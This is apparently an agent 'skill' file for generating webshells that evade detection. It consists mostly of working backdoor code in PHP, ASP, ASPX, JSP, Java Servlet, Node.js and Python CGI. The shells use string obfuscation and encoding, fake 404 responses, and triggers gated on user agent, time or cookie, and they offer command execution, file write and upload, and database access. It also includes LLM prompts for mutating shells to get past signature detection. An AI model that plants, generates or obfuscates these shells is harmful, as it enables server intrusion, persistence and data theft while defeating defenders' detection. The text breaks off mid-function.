---
name: "webshell-evasion"
description: "WebShell 免杀生成与权限管理：静态免杀/动态免杀/内存马/多语言WebShell/2026最新检测绕过/WAF穿透/一过性WebShell/冰蝎哥斯拉蚁剑免杀配置"
---

# SKILL: WebShell Evasion — 免杀生成、混淆、管理与穿透

> **AI LOAD INSTRUCTION**: Covers static evasion (variable obfuscation, string encryption, comment obfuscation, code compression, function name randomization), dynamic evasion (behavior masquerading, delay execution, traffic masquerading, User-Agent whitelist, Referer validation, password verification), multi-language WebShell (PHP/ASP/ASPX/JSP/Java/Node.js/Python CGI), 2026 latest evasion techniques (AI-generated WebShell mutation, LLM-based WAF bypass, AST-based code deformation, LLM-based WebShell obfuscator), WebShell management tools (AntSword/Behinder/Godzilla evasion config, traffic encryption, heartbeat masquerading), memory horse techniques (Java Filter/Listener/Servlet, Godzilla memory horse, PHP memory horse, ASP.NET memory horse), 2026 latest detection bypass (Alibaba Cloud WAF, Tencent Cloud WAF, Cloudflare, Imperva), one-shot WebShell (fileless, log-based, registry-based, scheduled task-based), WAF penetration (chunked transfer, compression transfer, TLS fingerprint masquerading, HTTP/2 multiplexing), and real-world scenarios (file upload bypass + evasion + persistence full chain).

## 0. RELATED ROUTING

- [file-upload-testing](../file-upload-testing/SKILL.md) — file upload exploitation primitives, content-type manipulation, polyglot files
- [waf-bypass-techniques](../waf-bypass-techniques/SKILL.md) — generic WAF fingerprinting and encoding bypass techniques
- [request-smuggling](../request-smuggling/SKILL.md) — HTTP request smuggling to bypass WAF inspection entirely
- [path-traversal-lfi](../path-traversal-lfi/SKILL.md) — log poisoning and LFI-to-RCE chains that can host WebShells
- [deserialization-insecure](../deserialization-insecure/SKILL.md) — Java deserialization memory horse injection via gadget chains
- [jndi-injection](../jndi-injection/SKILL.md) — JNDI/LDAP injection for remote memory horse delivery
- [ghost-bits-cast-attack](../ghost-bits-cast-attack/SKILL.md) — Ghost Bits type casting attack for Java-based WAF bypass on WebShell delivery
- [reverse-engineering](../reverse-engineering/SKILL.md) — reverse engineering WAF rules and detection signatures

---

## 1. WEBSHELL STATIC EVASION

Static evasion aims to bypass signature-based detection by AV engines, WAF rules, and static code analysis tools. The core principle is to make the WebShell code no longer match known malicious signatures.

### 1.1 Variable Name Obfuscation

Replace characteristic variable names (`$_POST`, `eval`, `assert`, `cmd`, `exec`) with randomly generated or semantically neutral names.

**PHP Example — Basic variable obfuscation:**

```php
<?php
// Original (detected signature)
$_POST['cmd'] = $_GET['pass'];
@eval($_POST['cmd']);

// Variable obfuscated
$l3m0n = '_PO' . 'ST';
$c0c0 = ${$l3m0n}['x7'];
$d0g3 = 'a' . 's' . 's' . 'e' . 'r' . 't';
$d0g3($c0c0);
?>
```

**PHP Example — Advanced dynamic variable assembly:**

```php
<?php
$k1 = chr(95).chr(80).chr(79).chr(83).chr(84);  // _POST
$k2 = chr(101).chr(118).chr(97).chr(108);        // eval
$v = $_REQUEST['_'];
if (strlen($v) > 0) {
    $GLOBALS[$k1] = $v;
    $k2($GLOBALS[$k1]);
}
?>
```

**PHP Example — Random variable name generation (one-time):**

```php
<?php
$r1 = substr(md5(rand()), 0, 8);
$r2 = substr(md5(rand()), 0, 8);
$r3 = substr(sha1(rand()), 0, 6);
$$r1 = $_REQUEST[$r3] ?? '';
if ($$r1) {
    call_user_func(chr(97).chr(115).chr(115).chr(101).chr(114).chr(116), $$r1);
}
?>
```

### 1.2 String Encryption and Splitting

Break characteristic strings like `eval`, `assert`, `system`, `exec`, `shell_exec`, `passthru` into non-contiguous fragments.

**PHP Example — String splitting techniques:**

```php
<?php
// Method 1: Concatenation
$f = 'as'.'sert';

// Method 2: chr() encoding
$f = chr(97).chr(115).chr(115).chr(101).chr(114).chr(116); // assert

// Method 3: base64 decode
$f = base64_decode('YXNzZXJ0');

// Method 4: strrev reverse
$f = strrev('tressa');

// Method 5: substr from a larger string
$f = substr('abcdefghijklmnopqrstuvwxyz', 0, 1) . substr('s', 0, 1) . substr('sample', 1, 1) . substr('hello', 1, 1) . substr('red', 1, 1) . substr('tree', 4, 1);

// Method 6: XOR encoding
$f = 'string1' ^ 'string2'; // yields target function name

// Method 7: bitwise NOT (~)
$f = ~"\x9e\x8d\x8d\x9a\x8d\x9e"; // yields certain strings

// Usage
$f(base64_decode($_POST['cmd']));
?>
```

**PHP Example — Multi-layer XOR encryption:**

```php
<?php
function xor_decrypt($data, $key) {
    $out = '';
    for ($i = 0; $i < strlen($data); $i++) {
        $out .= chr(ord($data[$i]) ^ ord($key[$i % strlen($key)]));
    }
    return $out;
}

$enc_payload = "\x12\x34\x56\x78..."; // pre-encrypted payload
$key = substr(md5($_SERVER['HTTP_HOST']), 0, 8);
$code = xor_decrypt($enc_payload, $key);
eval($code);
?>
```

**ASP Example:**

```
<%
Function d(s)
    d = ""
    For i = 1 To Len(s) Step 2
        d = d & Chr(CLng("&H" & Mid(s, i, 2)))
    Next
End Function

Dim cmd : cmd = Request("c")
If cmd <> "" Then
    Execute(d("4578656375746528636d6429")) ' Executes: Execute(cmd)
End If
%>
```

**ASPX Example:**

```csharp
<%@ Page Language="C#" %>
<script runat="server">
protected void Page_Load(object sender, EventArgs e) {
    string k = System.Text.Encoding.UTF8.GetString(
        System.Convert.FromBase64String(/* encoded key */));
    string c = Request.Params[k];
    if (!string.IsNullOrEmpty(c)) {
        System.Reflection.Assembly.Load(
            System.Convert.FromBase64String(c))
            .GetType("R.Run").GetMethod("Go").Invoke(null, null);
    }
}
</script>
```

### 1.3 Comment Obfuscation

Inject random comments (both valid and misleading) to break signature matching patterns.

**PHP Example:**

```php
<?php
// This is a database configuration file
// MySQL connection settings
// Copyright 2024 - All rights reserved

/**
 * Database Handler Class
 * @author Development Team
 * @version 2.1.3
 */

// config
$/*db*/_/*host*/P/*port*/O/*user*/S/*pass*/T/*name*/ = 'x';
$a = 'c'; // cache key
$b = 'm'; // buffer size
$c = 'd'; // connection timeout
$d = $a . $b . $c; // cmd
// logging functionality
$e = $/*debug*/_/*info*/P/*error*/O/*warn*/S/*trace*/T[$d];
// execute query
if ($e) {
    // Development mode: execute command
    $f = chr(101); // e
    $g = chr(118); // v
    $h = chr(97);  // a
    $i = chr(108); // l
    $f($g($h($i($e))));
    // End of database handler
}
// File end
?>
```

### 1.4 Code Compression and Minification

Strip whitespace, newlines, and comments to reduce signature surface area. Compress the code to a single line.

**PHP Example — One-liner:**

```php
<?php $x=$_REQUEST['x'];if($x){@call_user_func(chr(97).chr(115).chr(115).chr(101).chr(114).chr(116),base64_decode($x));}?>
```

**PHP Example — Gzip compressed eval:**

```php
<?php eval(gzinflate(base64_decode('S03OyFdQSyzNKVFIyy9S8MsvUijJzEktLlFIy89XKMpPUkjLz8xNBQAhfg1n'))); ?>
```

**PHP Example — Multi-layer compressed:**

```php
<?php
// Layer 1: base64 -> Layer 2: gzinflate -> Layer 3: str_rot13 -> eval
eval(str_rot13(gzinflate(base64_decode('ENCODED_STRING'))));
?>
```

### 1.5 Function Name Randomization

Use PHP dynamic function features to call dangerous functions by random names.

**PHP Example — callback array:**

```php
<?php
$funcs = ['system', 'exec', 'passthru', 'shell_exec', 'popen', 'proc_open'];
$idx = array_rand($funcs);
$f = $funcs[$idx];
$f($_POST['cmd']);
?>
```

**PHP Example — Reflection API:**

```php
<?php
$ref = new ReflectionFunction('system');
$ref->invoke($_POST['cmd']);
?>
```

**PHP Example — anonymous function / closure:**

```php
<?php
$f = function($cmd) {
    return `$cmd 2>&1`;
};
echo $f($_POST['cmd']);
?>
```

**JSP Example — Reflection-based execution:**

```java
<%@ page import="java.lang.reflect.*" %>
<%
String cmd = request.getParameter("cmd");
if (cmd != null) {
    Class rt = Class.forName("java.lang.Runtime");
    Method m = rt.getMethod("exec", String.class);
    Process p = (Process) m.invoke(rt.getMethod("getRuntime").invoke(null), cmd);
    java.io.InputStream in = p.getInputStream();
    int a;
    while ((a = in.read()) != -1) out.write(a);
}
%>
```

### 1.6 Heredoc / Nowdoc Obfuscation

**PHP Example — Heredoc masking:**

```php
<?php
$code = <<<CODE
\$x = \$_REQUEST['x'];
if(\$x) { eval(\$x); }
CODE;
eval($code);
?>
```

### 1.7 Unicode / UTF-8 Homoglyph Attacks

Replace ASCII characters in function names with visually similar Unicode characters that PHP may normalize.

**PHP Example:**

```php
<?php
// Use Unicode fullwidth characters or lookalike characters
// This relies on specific PHP version behavior with Unicode identifiers
// Note: PHP 7+ has restricted this significantly
// PHP 8+ Unicode identifiers are even more restricted
$f = "\u{0061}\u{0073}\u{0073}\u{0065}\u{0072}\u{0074}"; // assert
$f($_POST['cmd']);
?>
```

---

## 2. WEBSHELL DYNAMIC EVASION

Dynamic evasion focuses on runtime behavior: how the WebShell is accessed, triggered, and how it responds to detection probes.

### 2.1 Password / Key Verification

The most basic dynamic defense: refuse to execute without the correct password.

**PHP Example:**

```php
<?php
$password = 'mypass2026!@#';
if (!isset($_POST['pass']) || $_POST['pass'] !== $password) {
    header('HTTP/1.1 404 Not Found');
    die('<html><head><title>404 Not Found</title></head><body><h1>Not Found</h1></body></html>');
}
@eval($_POST['code']);
?>
```

**PHP Example — Multi-factor password verification:**

```php
<?php
$pw1 = $_POST['auth'] ?? '';
$pw2 = $_SERVER['HTTP_X_AUTH_TOKEN'] ?? '';
$pw3 = $_COOKIE['session_id'] ?? '';
$expected_hash = 'a1b2c3d4e5f6...'; // SHA256 of expected values

if (hash('sha256', $pw1 . $pw2 . $pw3 . $_SERVER['HTTP_USER_AGENT']) !== $expected_hash) {
    http_response_code(403);
    exit('Access Denied');
}
// Execute payload
eval($_POST['code']);
?>
```

### 2.2 User-Agent Whitelisting

Only respond to requests with a specific User-Agent string.

**PHP Example:**

```php
<?php
$allowed_ua = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36';
if ($_SERVER['HTTP_USER_AGENT'] !== $allowed_ua) {
    header('HTTP/1.1 404 Not Found');
    exit;
}
@eval($_POST['code']);
?>
```

**PHP Example — User-Agent regex pattern matching:**

```php
<?php
$ua = $_SERVER['HTTP_USER_AGENT'];
if (!preg_match('/^Mozilla\/5\.0 \(.*\) AppleWebKit\/537\.36.*Chrome\/1[2-9]\d/', $ua)) {
    header('HTTP/1.1 403 Forbidden');
    exit;
}
if (!isset($_POST['p']) || $_POST['p'] !== 's3cr3t') {
    exit;
}
eval($_POST['c']);
?>
```

### 2.3 Referer / Origin Validation

Require a specific Referer header to prevent automated scanners from triggering the WebShell.

**PHP Example:**

```php
<?php
$allowed_ref = 'https://admin.internal.example.com/';
if (!isset($_SERVER['HTTP_REFERER']) || strpos($_SERVER['HTTP_REFERER'], $allowed_ref) !== 0) {
    header('HTTP/1.1 404 Not Found');
    exit;
}
@eval($_POST['code']);
?>
```

### 2.4 Time-based / Conditional Activation

The WebShell only activates during specific time windows or after a certain number of requests.

**PHP Example — Time window activation:**

```php
<?php
// Only activate between 02:00 and 04:00 UTC
$hour = (int)date('H');
if ($hour < 2 || $hour > 4) {
    header('HTTP/1.1 404 Not Found');
    exit;
}
@eval($_POST['code']);
?>
```

**PHP Example — N-th request activation:**

```php
<?php
$counter_file = '/tmp/.cache_counter';
$count = (int)@file_get_contents($counter_file);
$count++;
@file_put_contents($counter_file, $count);
// Only activate on 3rd, 7th, or 13th request
if (!in_array($count, [3, 7, 13])) {
    header('HTTP/1.1 404 Not Found');
    exit;
}
@eval($_POST['code']);
?>
```

**PHP Example — IP-based activation (only from specific IP range):**

```php
<?php
$allowed_ips = ['10.0.0.0/8', '172.16.0.0/12', '192.168.0.0/16'];
$remote_ip = $_SERVER['REMOTE_ADDR'];
$allowed = false;
foreach ($allowed_ips as $cidr) {
    if (ip_in_cidr($remote_ip, $cidr)) { $allowed = true; break; }
}
if (!$allowed) { http_response_code(404); exit; }
eval($_POST['code']);

function ip_in_cidr($ip, $cidr) {
    list($subnet, $mask) = explode('/', $cidr);
    $ip_long = ip2long($ip);
    $subnet_long = ip2long($subnet);
    $mask_long = -1 << (32 - $mask);
    return ($ip_long & $mask_long) === ($subnet_long & $mask_long);
}
?>
```

### 2.5 Delay Execution

Introduce a random delay to evade time-based detection mechanisms.

**PHP Example:**

```php
<?php
// Random sleep between 1-5 seconds
sleep(rand(1, 5));
// Or microsecond sleep
usleep(rand(500000, 2000000));
@eval($_POST['code']);
?>
```

### 2.6 Traffic Masquerading

Return legitimate-looking responses to blend in with normal traffic.

**PHP Example — Fake 404 page:**

```php
<?php
if (!isset($_POST['secret']) || $_POST['secret'] !== 'mypass') {
    header('HTTP/1.1 404 Not Found');
    ?>
    <!DOCTYPE html>
    <html><head><title>404 Not Found</title>
    <style>body{font-family:Arial;text-align:center;padding:50px;}
    h1{font-size:50px;color:#333;}</style></head>
    <body><h1>404</h1><p>The page you requested was not found.</p></body></html>
    <?php
    exit;
}
$result = '';
exec($_POST['cmd'], $output);
foreach ($output as $line) { $result .= $line . "\n"; }
?>
<!DOCTYPE html>
<html><head><title>Admin Panel</title></head>
<body><h1>System Status</h1><pre><?php echo htmlspecialchars($result); ?></pre></body></html>
```

### 2.7 Cookie-based Trigger

**PHP Example:**

```php
<?php
if (!isset($_COOKIE['X-SESSION']) || $_COOKIE['X-SESSION'] !== 'auth_token_value') {
    header('HTTP/1.1 404 Not Found');
    exit;
}
@eval($_POST['code']);
?>
```

### 2.8 Multi-layer Dynamic Trigger Chain

Combine multiple dynamic checks into a defense-in-depth approach.

**PHP Example — Full trigger chain:**

```php
<?php
// Layer 1: Time window
$hour = (int)date('H');
if ($hour < 1 || $hour > 5) { http_response_code(404); exit; }

// Layer 2: User-Agent
$ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
if (strpos($ua, 'CustomClient/2.0') === false) { http_response_code(404); exit; }

// Layer 3: Custom header
if (($_SERVER['HTTP_X_VERIFY'] ?? '') !== hash('sha256', date('Ymd') . 'salt')) {
    http_response_code(404); exit;
}

// Layer 4: Password
if (($_POST['auth'] ?? '') !== 'supersecret2026') { http_response_code(404); exit; }

// Layer 5: Encrypted payload
$key = substr(hash('sha256', date('YmdH')), 0, 16);
$code = openssl_decrypt(base64_decode($_POST['data']), 'aes-256-cbc', $key, 0, substr($key, 0, 16));
if ($code) { eval($code); }
?>
```

---

## 3. MULTI-LANGUAGE WEBSHELL

### 3.1 PHP WebShell

**Basic one-liner:**

```php
<?php @eval($_POST['cmd']); ?>
```

**Advanced PHP WebShell with file manager:**

```php
<?php
/**
 * PHP File Manager WebShell
 * Usage: POST pass=xxx&action=cmd&data=base64(cmd)
 */
$pass = 'admin2026';
$action = $_POST['action'] ?? '';
$data = $_POST['data'] ?? '';

if (!isset($_POST['pass']) || $_POST['pass'] !== $pass) {
    header('HTTP/1.1 403 Forbidden');
    die('Access Denied');
}

switch ($action) {
    case 'cmd':
        $cmd = base64_decode($data);
        $output = shell_exec($cmd . ' 2>&1');
        echo '<pre>' . htmlspecialchars($output) . '</pre>';
        break;
    case 'read':
        if (file_exists($data)) {
            echo htmlspecialchars(file_get_contents($data));
        } else { echo 'File not found'; }
        break;
    case 'write':
        list($file, $content) = explode('|', base64_decode($data), 2);
        file_put_contents($file, $content);
        echo 'Written: ' . $file;
        break;
    case 'upload':
        move_uploaded_file($_FILES['file']['tmp_name'], $data);
        echo 'Uploaded to: ' . $data;
        break;
    case 'ls':
        $files = scandir($data ?: '.');
        foreach ($files as $f) {
            $path = ($data ?: '.') . '/' . $f;
            echo (is_dir($path) ? '[D] ' : '[F] ') . $f . ' (' . filesize($path) . ' bytes)<br>';
        }
        break;
    case 'delete':
        if (unlink($data)) { echo 'Deleted: ' . $data; }
        else { echo 'Delete failed'; }
        break;
    case 'info':
        phpinfo();
        break;
    case 'db':
        // Database query via PDO
        $info = json_decode(base64_decode($data), true);
        try {
            $pdo = new PDO("mysql:host={$info['host']};dbname={$info['db']}", $info['user'], $info['pass']);
            $stmt = $pdo->query($info['sql']);
            echo '<table border="1">';
            while ($row = $stmt->fetch(PDO::FETCH_ASSOC)) {
                echo '<tr>';
                foreach ($row as $col) { echo '<td>' . htmlspecialchars($col) . '</td>'; }
                echo '</tr>';
            }
            echo '</table>';
        } catch (Exception $e) { echo 'DB Error: ' . $e->getMessage(); }
        break;
    default:
        echo '<h1>WebShell Manager</h1>';
        echo '<p>Server: ' . $_SERVER['SERVER_SOFTWARE'] . '</p>';
        echo '<p>PHP: ' . phpversion() . '</p>';
        echo '<p>User: ' . get_current_user() . '</p>';
        echo '<p>OS: ' . PHP_OS . '</p>';
        echo '<p>CWD: ' . getcwd() . '</p>';
        echo '<p>Disabled Functions: ' . ini_get('disable_functions') . '</p>';
}
?>
```

### 3.2 ASP WebShell

**Classic ASP WebShell:**

```
<%@ Language=VBScript %>
<%
Dim cmd, objShell, objExec, output
cmd = Request("cmd")
If cmd <> "" Then
    Set objShell = Server.CreateObject("WScript.Shell")
    Set objExec = objShell.Exec("cmd.exe /c " & cmd)
    output = objExec.StdOut.ReadAll()
    Response.Write("<pre>" & Server.HTMLEncode(output) & "</pre>")
End If
%>
```

**ASP with file operations:**

```
<%
Function ExecuteSQL(sql)
    Dim conn, rs
    Set conn = Server.CreateObject("ADODB.Connection")
    conn.Open "Provider=SQLOLEDB;Data Source=localhost;Initial Catalog=master;User ID=sa;Password=password"
    Set rs = conn.Execute(sql)
    If Not rs.EOF Then ExecuteSQL = rs.GetString()
    rs.Close : conn.Close
End Function

Dim action : action = Request("a")
Select Case action
    Case "cmd"
        Dim o : Set o = Server.CreateObject("WScript.Shell")
        Response.Write "<pre>" & o.Exec("cmd /c " & Request("c")).StdOut.ReadAll() & "</pre>"
    Case "read"
        Dim fso, f : Set fso = Server.CreateObject("Scripting.FileSystemObject")
        Set f = fso.OpenTextFile(Request("f"), 1)
        Response.Write Server.HTMLEncode(f.ReadAll()) : f.Close
    Case "write"
        Set fso = Server.CreateObject("Scripting.FileSystemObject")
        Set f = fso.CreateTextFile(Request("f"), True)
        f.Write(Request("d")) : f.Close
        Response.Write "OK"
    Case "sql"
        Response.Write ExecuteSQL(Request("q"))
    Case Else
        Response.Write "<h1>ASP Shell</h1>"
End Select
%>
```

### 3.3 ASPX WebShell (C#)

```csharp
<%@ Page Language="C#" Debug="true" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Data.SqlClient" %>
<script runat="server">
protected void Page_Load(object sender, EventArgs e) {
    string pass = "admin2026";
    string p = Request.Params["pass"];
    if (p != pass) { Response.StatusCode = 404; Response.End(); return; }

    string action = Request.Params["a"];
    string data = Request.Params["d"];

    switch (action) {
        case "cmd":
            Process proc = new Process();
            proc.StartInfo.FileName = "cmd.exe";
            proc.StartInfo.Arguments = "/c " + data;
            proc.StartInfo.RedirectStandardOutput = true;
            proc.StartInfo.RedirectStandardError = true;
            proc.StartInfo.UseShellExecute = false;
            proc.StartInfo.CreateNoWindow = true;
            proc.Start();
            string output = proc.StandardOutput.ReadToEnd() + proc.StandardError.ReadToEnd();
            proc.WaitForExit();
            Response.Write("<pre>" + Server.HtmlEncode(output) + "</pre>");
            break;

        case "read":
            Response.Write("<pre>" + Server.HtmlEncode(File.ReadAllText(data)) + "</pre>");
            break;

        case "write":
            string[] parts = data.Split(new char[] { '|' }, 2);
            File.WriteAllText(parts[0], parts[1]);
            Response.Write("Written: " + parts[0]);
            break;

        case "upload":
            HttpPostedFile file = Request.Files[0];
            file.SaveAs(data);
            Response.Write("Uploaded: " + data);
            break;

        case "ls":
            string path = string.IsNullOrEmpty(data) ? Server.MapPath(".") : data;
            foreach (string f in Directory.GetFileSystemEntries(path)) {
                Response.Write((Directory.Exists(f) ? "[D] " : "[F] ") + f + "<br>");
            }
            break;

        case "sql":
            using (SqlConnection conn = new SqlConnection(data)) {
                conn.Open();
                SqlCommand cmd = new SqlCommand(Request.Params["q"], conn);
                SqlDataReader reader = cmd.ExecuteReader();
                while (reader.Read()) {
                    for (int i = 0; i < reader.FieldCount; i++)
                        Response.Write(reader[i] + "\t");
                    Response.Write("<br>");
                }
            }
            break;

        default:
            Response.Write("<h1>ASPX WebShell</h1>");
            Response.Write("<p>Server: " + Server.MachineName + "</p>");
            Response.Write("<p>User: " + Environment.UserName + "</p>");
            Response.Write("<p>OS: " + Environment.OSVersion + "</p>");
            Response.Write("<p>.NET: " + Environment.Version + "</p>");
            Response.Write("<p>Current Dir: " + Directory.GetCurrentDirectory() + "</p>");
            Response.Write("<p>App Domain: " + AppDomain.CurrentDomain.FriendlyName + "</p>");
            break;
    }
}
</script>
```

### 3.4 JSP WebShell

```java
<%@ page import="java.io.*,java.util.*,java.net.*,java.sql.*" %>
<%
String pass = "admin2026";
String p = request.getParameter("pass");
if (!pass.equals(p)) {
    response.setStatus(404);
    return;
}

String action = request.getParameter("a");
String data = request.getParameter("d");

if ("cmd".equals(action)) {
    Process proc = Runtime.getRuntime().exec(data);
    BufferedReader reader = new BufferedReader(new InputStreamReader(proc.getInputStream(), "GBK"));
    String line;
    out.println("<pre>");
    while ((line = reader.readLine()) != null) out.println(line);
    // Error stream
    BufferedReader errReader = new BufferedReader(new InputStreamReader(proc.getErrorStream(), "GBK"));
    while ((line = errReader.readLine()) != null) out.println(line);
    out.println("</pre>");
} else if ("read".equals(action)) {
    BufferedReader br = new BufferedReader(new FileReader(data));
    String line;
    out.println("<pre>");
    while ((line = br.readLine()) != null) out.println(line);
    out.println("</pre>");
    br.close();
} else if ("write".equals(action)) {
    String[] parts = data.split("\\|", 2);
    FileWriter fw = new FileWriter(parts[0]);
    fw.write(parts[1]);
    fw.close();
    out.println("Written: " + parts[0]);
} else if ("ls".equals(action)) {
    File dir = new File(data != null ? data : ".");
    for (File f : dir.listFiles()) {
        out.println((f.isDirectory() ? "[D] " : "[F] ") + f.getAbsolutePath() + " (" + f.length() + " bytes)<br>");
    }
} else {
    out.println("<h1>JSP WebShell</h1>");
    out.println("<p>Server: " + application.getServerInfo() + "</p>");
    out.println("<p>User: " + System.getProperty("user.name") + "</p>");
    out.println("<p>OS: " + System.getProperty("os.name") + "</p>");
    out.println("<p>Java: " + System.getProperty("java.version") + "</p>");
    out.println("<p>Current Dir: " + new File(".").getAbsolutePath() + "</p>");
}
%>
```

### 3.5 Java Servlet Memory-Ready WebShell

```java
import javax.servlet.*;
import javax.servlet.http.*;
import java.io.*;

public class ShellServlet extends HttpServlet {
    private static final String PASS = "admin2026";

    protected void doPost(HttpServletRequest req, HttpServletResponse resp)
            throws ServletException, IOException {
        resp.setContentType("text/html;charset=UTF-8");
        PrintWriter out = resp.getWriter();

        if (!PASS.equals(req.getParameter("pass"))) {
            resp.setStatus(404);
            return;
        }

        String action = req.getParameter("a");
        String data = req.getParameter("d");

        try {
            if ("cmd".equals(action)) {
                Process p = Runtime.getRuntime().exec(
                    new String[]{"cmd", "/c", data});
                BufferedReader reader = new BufferedReader(
                    new InputStreamReader(p.getInputStream(), "GBK"));
                String line;
                out.println("<pre>");
                while ((line = reader.readLine()) != null) out.println(line);
                out.println("</pre>");
            } else if ("read".equals(action)) {
                // File read logic
            } else if ("info".equals(action)) {
                out.println("Java: " + System.getProperty("java.version"));
                out.println("OS: " + System.getProperty("os.name"));
                out.println("User: " + System.getProperty("user.name"));
            }
        } catch (Exception e) {
            out.println("Error: " + e.getMessage());
        }
    }
}
```

### 3.6 Node.js WebShell

```javascript
const http = require('http');
const { exec } = require('child_process');
const fs = require('fs');
const crypto = require('crypto');

const PASS = 'admin2026';
const PORT = process.env.PORT || 4444;

http.createServer((req, res) => {
    let body = '';
    req.on('data', chunk => body += chunk);
    req.on('end', () => {
        const params = new URLSearchParams(body);
        const pass = params.get('pass');

        if (pass !== PASS) {
            res.writeHead(404);
            res.end('Not Found');
            return;
        }

        const action = params.get('a');
        const data = params.get('d');

        switch (action) {
            case 'cmd':
                exec(data, (err, stdout, stderr) => {
                    res.writeHead(200, {'Content-Type': 'text/html'});
                    res.end('<pre>' + stdout + stderr + '</pre>');
                });
                break;
            case 'read':
                fs.readFile(data, 'utf8', (err, content) => {
                    res.end('<pre>' + (err ? err.message : content) + '</pre>');
                });
                break;
            case 'ls':
                fs.readdir(data || '.', (err, files) => {
                    res.end(files.join('<br>'));
                });
                break;
            default:
                res.end('<h1>Node.js Shell</h1>' +
                    '<p>PID: ' + process.pid + '</p>' +
                    '<p>Node: ' + process.version + '</p>' +
                    '<p>CWD: ' + process.cwd() + '</p>');
        }
    });
}).listen(PORT, () => {
    console.log('Server running on port ' + PORT);
});
```

### 3.7 Python CGI WebShell

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import cgi
import subprocess
import os
import base64
import sys

PASS = 'admin2026'

def main():
    print("Content-Type: text/html; charset=utf-8\n")
    form = cgi.FieldStorage()

    if form.getvalue('pass') != PASS:
        print("Not Found")
        return

    action = form.getvalue('a', '')
    data = form.getvalue('d', '')

    if action == 'cmd':
        try:
            result = subprocess.check_output(data, shell=True, stderr=subprocess.STDOUT, timeout=30)
            print("<pre>" + result.decode('utf-8', errors='replace') + "</pre>")
        except subprocess.TimeoutExpired:
            print("<pre>Command timed out</pre>")
        except Exception as e:
            print("<pre>Error: " + str(e) + "</pre>")

    elif action == 'read':
        try:
            with open(data, 'r') as f:
                print("<pre>" + f.read() + "</pre>")
        except Exception as e:
            print("Error: " + str(e))

    elif action == 'ls':
        try:
            files = os.listdir(data or '.')
            for f in files:
                path = os.path.join(data or '.', f)
                prefix = '[D]' if os.path.isdir(path) else '[F]'
                size = os.path.getsize(path) if os.path.isfile(path) else 0
                print(f"{prefix} {f} ({size} bytes)<br>")
        except Exception as e:
            print("Error: " + str(e))

    elif action == 'upload':
        fileitem = form['file']
        if fileitem.filename:
            with open(data, 'wb') as f:
                f.write(fileitem.file.read())
            print("Uploaded: " + data)

    elif action == 'proxy':
        # Reverse proxy / port forward via Python
        import socket
        try:
            host, port = data.split(':')
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host, int(port)))
            s.send(b'GET / HTTP/1.0\r\n\r\n')
            resp = s.recv(4096)
            s.close()
            print("<pre>" + resp.decode('utf-8', errors='replace') + "</pre>")
        except Exception as e:
            print("Error: " + str(e))

    else:
        print("<h1>Python CGI WebShell</h1>")
        print("<p>Python: " + sys.version + "</p>")
        print("<p>OS: " + os.name + "</p>")
        print("<p>User: " + os.environ.get('USER', 'unknown') + "</p>")
        print("<p>CWD: " + os.getcwd() + "</p>")

if __name__ == '__main__':
    main()
```

---

## 4. 2026 LATEST EVASION TECHNIQUES

### 4.1 AI-Generated WebShell Mutation

Use large language models to generate semantically equivalent but syntactically different variants of WebShells, defeating signature-based detection.

**Mutation strategy using AI:**

```
PROMPT: "Rewrite the following PHP code to have the same functionality but
use completely different control flow, variable names, and function call
patterns. Add dead code, random comments, and meaningless conditional
branches. The output must still execute the same shell command."

INPUT: eval($_POST['cmd']);
OUTPUT (AI-generated variant):
  $config = parse_ini_string(base64_decode($_SERVER['HTTP_X_CONFIG'] ?? ''));
  $action = $config['log_level'] ?? 'debug';
  if ($action === 'debug') {
      $logger = function($msg) { file_put_contents('/tmp/app.log', $msg, FILE_APPEND); };
      $logger('Processing request');
  }
  $handler = $_POST['action'] ?? null;
  if ($handler && strlen($handler) > 0) {
      $processor = function($data) {
          $f = [chr(101), chr(118), chr(97), chr(108)];
          return $f[0] . $f[1] . $f[2] . $f[3];
      };
      $exec = $processor(null);
      $exec($_POST['cmd']);
  }
```

### 4.2 LLM-Based WebShell Obfuscator

A systematic approach to using LLMs for WebShell code transformation.

**Obfuscation pipeline:**

```
Step 1: Input WebShell code
Step 2: LLM parses the AST (Abstract Syntax Tree)
Step 3: Transformations applied:
  - Variable renaming using LLM-generated semantic names
  - Dead code injection (LLM generates plausible dead code)
  - Control flow flattening (LLM rewrites as switch-case)
  - String encryption (LLM chooses encoding scheme)
  - Comment injection (LLM generates realistic comments)
Step 4: Output obfuscated WebShell
Step 5: Verify functional equivalence
```

**LLM prompt engineering for obfuscation:**

```
SYSTEM: You are a code obfuscation engine. Your task is to transform
PHP code while preserving exact functionality. Apply these rules:
1. Rename all variables to random 8-character strings
2. Replace all string literals with chr() concatenation
3. Add 3 dead code blocks that look like legitimate business logic
4. Replace direct function calls with variable functions
5. Add realistic PHP comments in English
6. Wrap the entire code in a try-catch block
7. Output ONLY the transformed code, no explanations
```

### 4.3 AST-Based Code Deformation

Parse the WebShell code into an AST, then apply transformations at the tree level.

**Python-based AST transformation tool concept:**

```python
#!/usr/bin/env python3
"""
AST-Based PHP WebShell Deformation Tool
Transforms PHP WebShell code at the AST level for evasion.
"""
import random
import string
import hashlib

class PHPObfuscator:
    def __init__(self, seed=None):
        self.seed = seed or random.randint(0, 2**32)
        random.seed(self.seed)

    def generate_variable_name(self, length=8):
        chars = string.ascii_letters + string.digits
        return ''.join(random.choices(chars, k=length))

    def obfuscate_string(self, s):
        """Convert string to chr() concatenation"""
        return '.'.join(f'chr({ord(c)})' for c in s)

    def inject_dead_code(self, code):
        """Inject dead code blocks that look legitimate"""
        dead_blocks = [
            """
            // Cache configuration
            $cache_config = ['driver' => 'redis', 'ttl' => 3600];
            if (isset($cache_config['driver'])) {
                $cache_key = md5(uniqid());
            }
            """,
            """
            // Log rotation check
            $log_size = @filesize('/tmp/app.log');
            if ($log_size && $log_size > 10485760) {
                @rename('/tmp/app.log', '/tmp/app.log.bak');
            }
            """,
            """
            // Session cleanup
            $session_path = session_save_path();
            if ($session_path && is_dir($session_path)) {
                $session_files = glob($session_path . '/sess_*');
                $expired = array_filter($session_files, function($f) {
                    return time() - filemtime($f) > 3600;
                });
            }
            """,
        ]
        # Inject dead code at random positions
        lines = code.split('\n')
        for block in dead_blocks:
